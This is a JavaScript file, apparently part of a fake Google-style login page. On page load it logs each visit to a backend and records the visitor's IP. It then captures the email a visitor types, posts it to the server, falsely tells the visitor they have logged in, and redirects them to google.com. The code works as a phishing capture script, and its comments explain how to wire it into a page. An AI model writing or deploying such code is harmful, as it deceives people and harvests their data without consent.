// !! 確認form、email這兩個變數指定的id
// !! html的部分，要確認<form></form> 有沒有加上、email的欄位的id對不對
// !! 還要加上 <script src="/static/js/recordingLogin.js"></script>

// 1. 確認腳本有被載入執行
console.log("recordingLoginGoogle.js script started executing."); 

const url = window.location.href;

// 2. 確認 API_BASE_PATH 是否有值 (在 fetch 之前)
console.log("API_BASE_PATH:", typeof API_BASE_PATH !== 'undefined' ? API_BASE_PATH : "NOT DEFINED");

// 進頁面 送 IP 紀錄
// 3. 確認 initial fetch 是否被呼叫
console.log("Attempting initial fetch to /api/visit");
fetch(`${API_BASE_PATH}/api/visit`, {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ url: url })
})
.then(response => {
    // 4. 確認 initial fetch 的回應
    console.log("Initial fetch response status:", response.status);
    if (!response.ok) {
        console.error("Initial fetch failed:", response.statusText);
    }
})
.catch(err => {
    // 5. 確認 initial fetch 是否有錯誤
    console.error("Error during initial fetch:", err);
});

// 使用者提交 email
// 6. 確認按鈕是否存在
const loginButton = document.getElementById("login-button");
console.log("Login button element:", loginButton); 

if (loginButton) {
    // 7. 確認事件監聽器有被加上
    console.log("Adding click listener to login button.");
    loginButton.addEventListener("click", function () {
        // 8. 確認點擊事件有被觸發
        console.log("Login button clicked!"); 

        // 9. 確認 email input 是否存在
        const emailInput = document.getElementById("email");
        console.log("Email input element:", emailInput);
        
        if (!emailInput) {
            console.error("Could not find email input element!");
            return; // 如果找不到 email 輸入框，停止執行
        }

        const email = emailInput.value;
        // 10. 確認 email 的值
        console.log("Email value:", email); 
        
        // 11. 確認 fetch input 是否被呼叫
        console.log("Attempting fetch to /api/input with email:", email); 
        fetch(`${API_BASE_PATH}/api/input`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ email: email, url: url })
        })
        .then(response => {
            // 12. 確認 fetch input 的回應
            console.log("Input fetch response status:", response.status); 
            if (!response.ok) {
                console.error("Input fetch failed:", response.statusText);
                throw new Error("伺服器錯誤");
            }
            return response.text();
        })
        .then(data => {
            // 13. 確認 fetch input 成功後的操作
            console.log("Input fetch successful, showing alert."); 
            alert(`歡迎，${email}！您已成功登入。`);
            window.location.href = "https://www.google.com";
        })
        .catch(err => {
            // 14. 確認 fetch input 是否有錯誤
            console.error("Error during input fetch:", err); 
            alert("⚠️ 登入失敗：" + err.message);
        });
    });
} else {
    // 如果找不到按鈕，在這裡報錯
    console.error("Could not find login button element!");
}

// 15. 確認腳本執行完畢
console.log("recordingLoginGoogle.js script finished executing.");